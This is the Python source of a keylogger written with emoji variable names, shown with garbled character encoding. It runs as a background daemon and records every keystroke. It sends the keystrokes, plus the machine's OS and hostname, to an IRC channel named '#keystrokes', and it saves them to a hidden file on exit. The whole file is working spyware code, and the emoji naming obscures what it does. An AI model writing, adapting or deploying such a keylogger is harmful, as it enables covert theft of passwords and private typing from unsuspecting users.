import threading as ğŸ§µ
import platform as ğŸ“±
import keyboard as âŒ¨
import daemon as ğŸ˜ˆ
import select as â˜‘ï¸
import socket as ğŸ”Œ
import time as ğŸ•°ï¸

ğŸ¢ = "localhost"
ğŸšª = 6667
ğŸšï¸ = "#keystrokes"
ğŸ‘¤ = "emoji"
ğŸ“ = ".ğŸ’¼"

ğŸƒâ€â™‚ï¸ = False
ğŸ” = 510 - 12 - len(ğŸšï¸)

class ğŸªµ:
    
    def __init__(self):

        global ğŸƒâ€â™‚ï¸, ğŸ¢, ğŸšª, ğŸšï¸, ğŸ‘¤, ğŸ“, ğŸ§µ, âŒ¨

        self.ğŸ“œ = ""
        self.ğŸ“– = ""

        ğŸƒâ€â™‚ï¸ = True

        self.ğŸ›œ(ğŸ¢, ğŸšª, ğŸšï¸, ğŸ‘¤)

        self.ğŸª¡ = ğŸ§µ.Thread(target=self.ğŸ“)
        self.ğŸª¡.start()

        âŒ¨.on_press(self.ğŸ‘‡)

        âŒ¨.wait("esc")
        ğŸƒâ€â™‚ï¸ = False
        self.ğŸ(ğŸ“)


    # Connect to IRC server and join channel
    def ğŸ›œ(self, ğŸ¢, ğŸšª, ğŸšï¸, ğŸ‘¤):
        global ğŸ”Œ, ğŸ•°ï¸

        ğŸ“¡ = ğŸ”Œ.socket(ğŸ”Œ.AF_INET, ğŸ”Œ.SOCK_STREAM)
        ğŸ“¡.setblocking(False)

        try:
            ğŸ“¡.connect((ğŸ¢, ğŸšª))
        except BlockingIOError:
            pass

        ğŸ•°ï¸.sleep(3)
        ğŸ“¡.send(bytes("USER " + ğŸ‘¤ + " * * : " + ğŸ‘¤ + "\r\n", "UTF-8"))
        ğŸ“¡.send(bytes("NICK " + ğŸ‘¤ + "\r\n", "UTF-8"))
        ğŸ“¡.send(bytes("JOIN " + ğŸšï¸ + "\r\n", "UTF-8"))

        ğŸ“‹ = self.â„¹ï¸()

        for ğŸªª in ğŸ“‹:
            ğŸ•°ï¸.sleep(0.3)
            ğŸ“¡.send(bytes("PRIVMSG " + ğŸšï¸ + " : " + ğŸªª + "\r\n", "UTF-8"))

        self.ğŸ“¡ = ğŸ“¡


    # On key press function
    def ğŸ‘‡(self, ğŸ§‘ğŸ½â€ğŸ’»):
        global ğŸ”

        ğŸ”‘ = ğŸ§‘ğŸ½â€ğŸ’».name

        # Do some readability adjustments
        if ğŸ”‘ in ["enter", "space"]:
            ğŸ”‘ = " "
        elif ğŸ”‘ == "backspace":
            self.ğŸ“œ = self.ğŸ“œ[:-1]

        if len(ğŸ”‘) == 1:
            if âŒ¨.is_pressed("shift") or âŒ¨.is_pressed("caps lock"):
                ğŸ”‘ = ğŸ”‘.upper()

            self.ğŸ“œ += ğŸ”‘

        # Send the captured keystrokes to the IRC server if the size reaches the maximum allowed length of an IRC message
        self.ğŸ“– = self.ğŸ“œ[int(len(self.ğŸ“œ) / ğŸ”) * ğŸ”:]

        if len(self.ğŸ“–) >= ğŸ” - 1:
            self.ğŸ“¡.send(bytes("PRIVMSG " + ğŸšï¸ + " : " + self.ğŸ“– + "\r\n", "UTF-8"))
            

    # Get system information
    def â„¹ï¸(self) -> list[str]:
        global ğŸ“±, ğŸ”Œ

        ğŸ”™ = []

        ğŸ“, ğŸ’½ = ğŸ“±.architecture()
        ğŸ”™.append("+---------------")
        ğŸ”™.append(f"| OS: {ğŸ“±.system()} {ğŸ“±.release()} {ğŸ“±.version()}")
        ğŸ”™.append(f"| Architecture/Processor: {ğŸ“} {ğŸ’½} {ğŸ“±.processor()}")
        ğŸ”™.append(f"| Hostname: {ğŸ”Œ.gethostname()}")
        ğŸ”™.append("+---------------")

        return ğŸ”™


    # Keep alive mechanism
    def ğŸ“(self):
        global ğŸƒâ€â™‚ï¸, â˜‘ï¸, ğŸ•°ï¸

        while ğŸƒâ€â™‚ï¸:
            ğŸ‘ï¸â€ğŸ—¨ï¸, _, _ = â˜‘ï¸.select(filter(lambda ğŸ›°ï¸: ğŸ›°ï¸.fileno() != -1, [self.ğŸ“¡]), [], [], 0)

            if self.ğŸ“¡ in ğŸ‘ï¸â€ğŸ—¨ï¸:
                ğŸ“² = self.ğŸ“¡.recv(4096).decode()

                if "PING" in ğŸ“²:
                    self.ğŸ“¡.send(bytes("PONG " + ğŸ“².split(" ")[1] + "\r\n", "UTF-8"))
            
            ğŸ•°ï¸.sleep(1)


    # Save captured keystrokes to file
    def ğŸ(self, ğŸ“):
        with open(ğŸ“, "w") as ğŸ“„:
            ğŸ“„.write(self.ğŸ“œ)

        self.ğŸ“¡.close()


if __name__ == "__main__":
    with ğŸ˜ˆ.DaemonContext():
        ğŸªµ()